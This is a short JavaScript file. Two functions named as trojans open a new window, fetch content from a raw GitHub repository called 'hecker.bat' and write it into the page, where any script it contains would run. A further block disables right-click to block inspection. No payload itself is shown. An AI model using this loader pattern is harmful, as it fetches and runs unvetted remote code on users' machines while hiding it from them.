/*Startup code*/
function InternalTrojan(lnk) {
	let win = window.open();
	fetch("https://raw.githubusercontent.com/25HoursaDay/hecker.bat/"+lnk)
	.then((result) => { return result.text(); })
	.then((content) => { win.document.write(content); });
}
function ExternalTrojan(lnk) {
	let win = window.open();
	fetch("https://raw.githubusercontent.com/25HoursaDay/hecker.bat/"+lnk)
	.then((result) => { return result.text(); })
	.then((content) => { win.document.write(content); });
}


/*Security Measures*/
document.oncontextmenu = rightClick;
function rightClick(clickEvent) {clickEvent.preventDefault();}  
